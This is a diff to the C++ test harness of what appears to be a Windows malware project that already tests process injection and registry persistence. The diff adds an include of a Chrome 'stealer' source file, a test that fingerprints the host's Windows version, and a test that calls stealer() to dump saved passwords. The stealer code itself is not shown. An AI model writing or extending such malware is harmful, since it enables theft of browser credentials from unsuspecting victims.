@@ -2,6 +2,7 @@
 #include "aes_gcm.h"
 #include "http.h"
 #include "inject.h"
+#include "../stealer/chrome.cpp"
 #include <iostream>
 #include <fstream>
 
@@ -148,6 +149,70 @@ void test_persistence()
     RegCloseKey(hKey);
 }
 
+void test_aware()
+{
+    // std::string buf;
+    // std::string name = "USERNAME";
+    // std::cout << buf.size() << std::endl;
+    // buf.resize(100);
+    // std::cout << buf.size() << std::endl;
+    // std::cout << GetEnvironmentVariableA(&name[0], &buf[0], DWORD(100)) << std::endl;
+    // std::cout << buf << std::endl;
+
+    // std::string buf;
+    // buf.resize(BUF_SIZE);
+    // DWORD bufSize = BUF_SIZE;
+    // GetComputerNameA(&buf[0], &bufSize);
+    // buf.shrink_to_fit();
+    // std::cout << buf << std::endl;
+
+    // DWORD version = GetVersion();
+
+    // std::string buf;
+    // buf.resize(BUF_SIZE);
+    // itoa(version, &buf[0], 10);
+    // buf.shrink_to_fit();
+
+    // std::cout << version << std::endl;
+
+    DWORD dwVersion = 0; 
+    DWORD dwMajorVersion = 0;
+    DWORD dwMinorVersion = 0; 
+    DWORD dwBuild = 0;
+
+    dwVersion = GetVersion();
+ 
+    // Get the Windows version.
+
+    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
+    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
+
+    // Get the build number.
+
+    if (dwVersion < 0x80000000)              
+        dwBuild = (DWORD)(HIWORD(dwVersion));
+
+    printf("Version is %d.%d (%d)\n", 
+                dwMajorVersion,
+                dwMinorVersion,
+                dwBuild);
+    
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    sprintf(&buf[0], "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);
+    buf.shrink_to_fit();
+    std::cout << buf << std::endl;
+
+    // return buf;
+
+}
+
+void test_steal() {
+    std::string passwords = stealer();
+    std::cout << passwords << std::endl;
+
+    std::cout << "this is after stealer" << std::endl;
+}
 
 int main(int argc, char* argv[])
 {   
@@ -168,6 +233,10 @@ int main(int argc, char* argv[])
         test_inject();
     } else if (test_name == "persistence") {
         test_persistence();
+    } else if (test_name == "aware") {
+        test_aware();
+    } else if (test_name == "steal") {
+        test_steal();
     } else {
         std::cout << "test name invalid" << std::endl;
     }
